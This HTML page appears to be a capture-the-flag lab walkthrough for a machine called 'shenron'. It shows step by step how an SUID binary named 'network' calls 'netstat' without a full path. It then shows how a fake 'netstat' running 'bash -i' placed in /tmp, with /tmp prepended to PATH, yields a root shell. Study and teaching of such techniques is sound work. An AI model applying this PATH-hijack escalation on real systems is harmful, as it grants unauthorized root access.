<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1 Execute binary as root</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1 Execute binary as root</h1><br/><br />1. On your “Reverse shell” list the files.<br />    <div class="codebox"><div class="codebox">shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~$&nbsp;<span style="color:#a52a2a;font-weight:700">ls</span>&nbsp;-al&nbsp;shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al&nbsp;</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/769-1.png" alt="images/769-1.png" /><br />   There is an SUID binary called “network", which could lead us to get root access.<br />   <br />2. Run the “network” binary.<br />    <div class="codebox"><div class="codebox">shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~$.<span style="color:#a52a2a;font-weight:700">/</span>network<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/769-2.png" alt="images/769-2.png" /><br />    <br />    The binary calls another program called “netstat”.<br /><br />3. Run “netstat”.<br />    <div class="codebox"><div class="codebox">shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$netstat</span>&nbsp;-ltunp<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/769-3.png" alt="images/769-3.png" /><br /><br />    So, the binary run “netstat”, therefore you can create your own binary and name it as “netstat”. Then, you can add the  directory containing the new binary to the PATH.<br />    As we know in linux, we can either use full path, relative path or PATH variables from system or user environments. Suppose, if the binary had used <code>/usr/bin/netstat</code> then, it is a full path. However, if it uses <code>netstat</code> only, then the binary is checked in path variables. <br />   <br />4. Create “netstat” binary that would run a “bash shell”.<br />    <div class="codebox"><div class="codebox">shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<br />shenron@shenron<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$echo</span>&nbsp;<span style="color:#ff00ff;font-weight:400">'bash&nbsp;-i&nbsp;#'</span>&nbsp;&gt;&nbsp;netstat<br />shenron@shenron<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$chmod</span>&nbsp;+x&nbsp;netstatshenron@shenron<span style="color:#a52a2a;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#a52a2a;font-weight:700">export</span>&nbsp;<span style="color:#6a5acd;font-weight:400">PATH</span>=<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/:</span><span style="color:#6a5acd;font-weight:400">$PATH</span>&nbsp;<span style="color:#0000ff;font-weight:400">#&nbsp;add&nbsp;/tmp&nbsp;to&nbsp;the&nbsp;PATH</span><br />shenron@shenron<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$cd</span><br />shenron@shenron<span style="color:#a52a2a;font-weight:700">:</span>~$.<span style="color:#a52a2a;font-weight:700">/</span>network<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/769-4.png" alt="images/769-4.png" /><br /><br />    You are “root”.<br /><br />5. <br /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>